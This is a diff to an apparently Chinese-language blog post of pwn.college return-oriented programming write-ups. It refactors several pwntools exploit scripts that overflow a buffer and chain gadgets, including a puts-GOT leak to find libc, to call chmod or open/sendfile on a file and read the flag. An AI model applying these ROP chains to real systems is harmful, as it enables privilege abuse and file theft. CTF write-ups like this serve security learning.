@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Return Oriented Programming) series"
 pubDate: "2025-01-19 13:34"
-modDate: "2025-01-20 18:54"
+modDate: "2025-01-21 13:34"
 categories:
   - "Pwn"
   - "Write-ups"
@@ -927,12 +927,12 @@ Flag: `pwn.college{o7dF6gbwKmwO-Xrdr1WGG5iKIQ-.0lN0MDL5cTNxgzW}`
 from pwn import (
     ELF,
     ROP,
+    constants,
     context,
     flat,
     gdb,
     log,
     os,
-    p64,
     process,
     remote,
 )
@@ -979,22 +979,21 @@ def construct_payload():
 
     filename = next(elf.search(b"ret"))
     mode = 0o4
-    SYS_chmod = 0x5A
 
-    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
-    pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
-    pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
-    syscall = rop.find_gadget(["syscall"]).address
+    pop_rdi_ret = rop.rdi.address
+    pop_rsi_ret = rop.rsi.address
+    pop_rax_ret = rop.rax.address
+    syscall = rop.syscall.address
 
     payload = padding_to_ret
     payload += flat(
-        p64(pop_rdi_ret),
-        p64(filename),
-        p64(pop_rsi_ret),
-        p64(mode),
-        p64(pop_rax_ret),
-        p64(SYS_chmod),
-        p64(syscall),
+        pop_rdi_ret,
+        filename,
+        pop_rsi_ret,
+        mode,
+        pop_rax_ret,
+        constants.SYS_chmod,
+        syscall,
     )
 
     return payload
@@ -1065,12 +1064,12 @@ Flag: `pwn.college{EXzWCvmQZIa9w6wrK_nx0PK1w3_.01N0MDL5cTNxgzW}`
 from pwn import (
     ELF,
     ROP,
+    constants,
     context,
     flat,
     gdb,
     log,
     os,
-    p64,
     process,
     remote,
 )
@@ -1116,22 +1115,21 @@ def construct_payload():
 
     filename = next(elf.search(b"###"))
     mode = 0o4
-    SYS_chmod = 0x5A
 
-    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
-    pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
-    pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
-    syscall = rop.find_gadget(["syscall"]).address
+    pop_rdi_ret = rop.rdi.address
+    pop_rsi_ret = rop.rsi.address
+    pop_rax_ret = rop.rax.address
+    syscall = rop.syscall.address
 
     payload = padding_to_ret
     payload += flat(
-        p64(pop_rdi_ret),
-        p64(filename),
-        p64(pop_rsi_ret),
-        p64(mode),
-        p64(pop_rax_ret),
-        p64(SYS_chmod),
-        p64(syscall),
+        pop_rdi_ret,
+        filename,
+        pop_rsi_ret,
+        mode,
+        pop_rax_ret,
+        constants.SYS_chmod,
+        syscall,
     )
 
     return payload
@@ -1202,12 +1200,12 @@ Flag: `pwn.college{g2fR-zCK75_60foo4wveIENcvF0.0FO0MDL5cTNxgzW}`
 from pwn import (
     ELF,
     ROP,
+    constants,
     context,
     flat,
     gdb,
     log,
     os,
-    p64,
     process,
     remote,
 )
@@ -1253,22 +1251,21 @@ def construct_payload():
 
     filename = next(elf.search(b"GNU"))
     mode = 0o4
-    SYS_chmod = 0x5A
 
-    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
-    pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
-    pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
-    syscall = rop.find_gadget(["syscall"]).address
+    pop_rdi_ret = rop.rdi.address
+    pop_rsi_ret = rop.rsi.address
+    pop_rax_ret = rop.rax.address
+    syscall = rop.syscall.address
 
     payload = padding_to_ret
     payload += flat(
-        p64(pop_rdi_ret),
-        p64(filename),
-        p64(pop_rsi_ret),
-        p64(mode),
-        p64(pop_rax_ret),
-        p64(SYS_chmod),
-        p64(syscall),
+        pop_rdi_ret,
+        filename,
+        pop_rsi_ret,
+        mode,
+        pop_rax_ret,
+        constants.SYS_chmod,
+        syscall,
     )
 
     return payload
@@ -1339,12 +1336,12 @@ Flag: `pwn.college{sAqwz2eKPKj_t1zS9diA-_sbUf0.0VO0MDL5cTNxgzW}`
 from pwn import (
     ELF,
     ROP,
+    constants,
     context,
     flat,
     gdb,
     log,
     os,
-    p64,
     process,
     remote,
 )
@@ -1390,22 +1387,21 @@ def construct_payload():
 
     filename = next(elf.search(b"GNU"))
     mode = 0o4
-    SYS_chmod = 0x5A
 
-    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
-    pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
-    pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
-    syscall = rop.find_gadget(["syscall"]).address
+    pop_rdi_ret = rop.rdi.address
+    pop_rsi_ret = rop.rsi.address
+    pop_rax_ret = rop.rax.address
+    syscall = rop.syscall.address
 
     payload = padding_to_ret
     payload += flat(
-        p64(pop_rdi_ret),
-        p64(filename),
-        p64(pop_rsi_ret),
-        p64(mode),
-        p64(pop_rax_ret),
-        p64(SYS_chmod),
-        p64(syscall),
+        pop_rdi_ret,
+        filename,
+        pop_rsi_ret,
+        mode,
+        pop_rax_ret,
+        constants.SYS_chmod,
+        syscall,
     )
 
     return payload
@@ -1489,12 +1485,12 @@ ssize_t __fastcall force_import(const char *a1, int a2)
 from pwn import (
     ELF,
     ROP,
+    constants,
     context,
     flat,
     gdb,
     log,
     os,
-    p64,
     process,
     remote,
 )
@@ -1539,12 +1535,9 @@ def construct_payload():
 
     padding_to_ret = b"".ljust(0x58, b"A")
 
-    open = elf.symbols["open"]
-    sendfile = elf.symbols["sendfile"]
-
     # args for open
     filename = next(elf.search(b"GNU"))
-    flags = 0x0
+    flags = constants.O_RDONLY
 
     # args for sendfile
     out_fd = 0x1
@@ -1552,27 +1545,27 @@ def construct_payload():
     offset = 0x0
     count = 0x1000
 
-    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
-    pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
-    pop_rdx_ret = rop.find_gadget(["pop rdx", "ret"]).address
-    pop_rcx_ret = rop.find_gadget(["pop rcx", "ret"]).address
+    pop_rdi_ret = rop.rdi.address
+    pop_rsi_ret = rop.rsi.address
+    pop_rdx_ret = rop.rdx.address
+    pop_rcx_ret = rop.rcx.address
 
     payload = padding_to_ret
     payload += flat(
-        p64(pop_rdi_ret),
-        p64(filename),
-        p64(pop_rsi_ret),
-        p64(flags),
-        p64(open),
-        p64(pop_rdi_ret),
-        p64(out_fd),
-        p64(pop_rsi_ret),
-        p64(in_fd),
-        p64(pop_rdx_ret),
-        p64(offset),
-        p64(pop_rcx_ret),
-        p64(count),
-        p64(sendfile),
+        pop_rdi_ret,
+        filename,
+        pop_rsi_ret,
+        flags,
+        elf.symbols["open"],
+        pop_rdi_ret,
+        out_fd,
+        pop_rsi_ret,
+        in_fd,
+        pop_rdx_ret,
+        offset,
+        pop_rcx_ret,
+        count,
+        elf.symbols["sendfile"],
     )
 
     return payload
@@ -1633,12 +1626,12 @@ Flag: `pwn.college{0u8eS8EM1OTTXbPHdwgRj2FQ4m0.0VM1MDL5cTNxgzW}`
 from pwn import (
     ELF,
     ROP,
+    constants,
     context,
     flat,
     gdb,
     log,
     os,
-    p64,
     process,
     remote,
 )
@@ -1682,12 +1675,9 @@ def construct_payload():
 
     padding_to_ret = b"".ljust(0x28, b"A")
 
-    open = elf.symbols["open"]
-    sendfile = elf.symbols["sendfile"]
-
     # args for open
     filename = next(elf.search(b"GNU"))
-    flags = 0x0
+    flags = constants.O_RDONLY
 
     # args for sendfile
     out_fd = 0x1
@@ -1695,27 +1685,27 @@ def construct_payload():
     offset = 0x0
     count = 0x1000
 
-    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
-    pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
-    pop_rdx_ret = rop.find_gadget(["pop rdx", "ret"]).address
-    pop_rcx_ret = rop.find_gadget(["pop rcx", "ret"]).address
+    pop_rdi_ret = rop.rdi.address
+    pop_rsi_ret = rop.rsi.address
+    pop_rdx_ret = rop.rdx.address
+    pop_rcx_ret = rop.rcx.address
 
     payload = padding_to_ret
     payload += flat(
-        p64(pop_rdi_ret),
-        p64(filename),
-        p64(pop_rsi_ret),
-        p64(flags),
-        p64(open),
-        p64(pop_rdi_ret),
-        p64(out_fd),
-        p64(pop_rsi_ret),
-        p64(in_fd),
-        p64(pop_rdx_ret),
-        p64(offset),
-        p64(pop_rcx_ret),
-        p64(count),
-        p64(sendfile),
+        pop_rdi_ret,
+        filename,
+        pop_rsi_ret,
+        flags,
+        elf.symbols["open"],
+        pop_rdi_ret,
+        out_fd,
+        pop_rsi_ret,
+        in_fd,
+        pop_rdx_ret,
+        offset,
+        pop_rcx_ret,
+        count,
+        elf.symbols["sendfile"],
     )
 
     return payload
@@ -1777,6 +1767,8 @@ hacker@return-oriented-programming~level7-0:~$ ldd /challenge/babyrop_level7.0
         /lib64/ld-linux-x86-64.so.2 (0x0000745ac077b000)
 ```
 
+嗯……如果你不知道我讲的是什么，建议去补习一下 PLT 延迟绑定。推荐看**_《程序员的自我修养——链接、装载与库》_**，**_CSAPP_** 也可以看看，反正底层知识有空一定要多学学，非常重要。
+
 哎不对，难道说 [Level 4](#level-40)……
 
 ### Exploit
@@ -1792,7 +1784,6 @@ from pwn import (
     gdb,
     log,
     os,
-    p64,
     process,
     remote,
 )
@@ -1838,23 +1829,22 @@ def construct_payload(leaked_addr):
 
     padding_to_ret = b"".ljust(0x58, b"A")
 
-    libc_base = leaked_addr - libc.symbols["system"]
-    chmod = libc_base + libc.symbols["chmod"]
+    libc.address = leaked_addr - libc.symbols["system"]
 
     filename = next(elf.search(b"GNU"))
     mode = 0o4
 
-    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
+    pop_rdi_ret = rop.rdi.address
     pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
 
     payload = padding_to_ret
     payload += flat(
-        p64(pop_rdi_ret),
-        p64(filename),
-        p64(pop_rsi_pop_r15_ret),
-        p64(mode),
+        pop_rdi_ret,
+        filename,
+        pop_rsi_pop_r15_ret,
+        mode,
         b"".ljust(0x8, b"A"),
-        p64(chmod),
+        libc.symbols["chmod"],
     )
 
     return payload
@@ -1903,7 +1893,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 ```
 
 ### Flag
@@ -1937,7 +1926,6 @@ from pwn import (
     gdb,
     log,
     os,
-    p64,
     process,
     remote,
 )
@@ -1982,23 +1970,22 @@ def construct_payload(leaked_addr):
 
     padding_to_ret = b"".ljust(0x48, b"A")
 
-    libc_base = leaked_addr - libc.symbols["system"]
-    chmod = libc_base + libc.symbols["chmod"]
+    libc.address = leaked_addr - libc.symbols["system"]
 
     filename = next(elf.search(b"GNU"))
     mode = 0o4
 
-    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
+    pop_rdi_ret = rop.rdi.address
     pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
 
     payload = padding_to_ret
     payload += flat(
-        p64(pop_rdi_ret),
-        p64(filename),
-        p64(pop_rsi_pop_r15_ret),
-        p64(mode),
+        pop_rdi_ret,
+        filename,
+        pop_rsi_pop_r15_ret,
+        mode,
         b"".ljust(0x8, b"A"),
-        p64(chmod),
+        libc.symbols["chmod"],
     )
 
     return payload
@@ -2082,7 +2069,6 @@ from pwn import (
     gdb,
     log,
     os,
-    p64,
     process,
     remote,
 )
@@ -2128,38 +2114,33 @@ def construct_payload(stage, leaked_addr=None):
 
     padding_to_ret = b"".ljust(0x38, b"A")
 
-    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
+    pop_rdi_ret = rop.rdi.address
     pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
 
     payload = padding_to_ret
 
     if stage == 1:
-        _start = elf.symbols["_start"]
-        puts_plt = elf.plt["puts"]
-        puts_got = elf.got["puts"]
-
         payload += flat(
-            p64(pop_rdi_ret),
-            p64(puts_got),
-            p64(puts_plt),
-            p64(_start),
+            pop_rdi_ret,
+            elf.got["puts"],
+            elf.plt["puts"],
+            elf.symbols["_start"],
         )
 
         return payload
     elif stage == 2:
-        libc_base = leaked_addr - libc.symbols["puts"]
-        chmod = libc_base + libc.symbols["chmod"]
+        libc.address = leaked_addr - libc.symbols["puts"]
 
         filename = next(elf.search(b"GNU"))
         mode = 0o4
 
         payload += flat(
-            p64(pop_rdi_ret),
-            p64(filename),
-            p64(pop_rsi_pop_r15_ret),
-            p64(mode),
+            pop_rdi_ret,
+            filename,
+            pop_rsi_pop_r15_ret,
+            mode,
             b"".ljust(0x8, b"A"),
-            p64(chmod),
+            libc.symbols["chmod"],
         )
 
         return payload
@@ -2247,7 +2228,6 @@ from pwn import (
     gdb,
     log,
     os,
-    p64,
     process,
     remote,
 )
@@ -2292,38 +2272,33 @@ def construct_payload(stage, leaked_addr=None):
 
     padding_to_ret = b"".ljust(0x78, b"A")
 
-    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
+    pop_rdi_ret = rop.rdi.address
     pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
 
     payload = padding_to_ret
 
     if stage == 1:
-        _start = elf.symbols["_start"]
-        puts_plt = elf.plt["puts"]
-        puts_got = elf.got["puts"]
-
         payload += flat(
-            p64(pop_rdi_ret),
-            p64(puts_got),
-            p64(puts_plt),
-            p64(_start),
+            pop_rdi_ret,
+            elf.got["puts"],
+            elf.plt["puts"],
+            elf.symbols["_start"],
         )
 
         return payload
     elif stage == 2:
-        libc_base = leaked_addr - libc.symbols["puts"]
-        chmod = libc_base + libc.symbols["chmod"]
+        libc.address = leaked_addr - libc.symbols["puts"]
 
         filename = next(elf.search(b"GNU"))
         mode = 0o4
 
         payload += flat(
-            p64(pop_rdi_ret),
-            p64(filename),
-            p64(pop_rsi_pop_r15_ret),
-            p64(mode),
+            pop_rdi_ret,
+            filename,
+            pop_rsi_pop_r15_ret,
+            mode,
             b"".ljust(0x8, b"A"),
-            p64(chmod),
+            libc.symbols["chmod"],
         )
 
         return payload
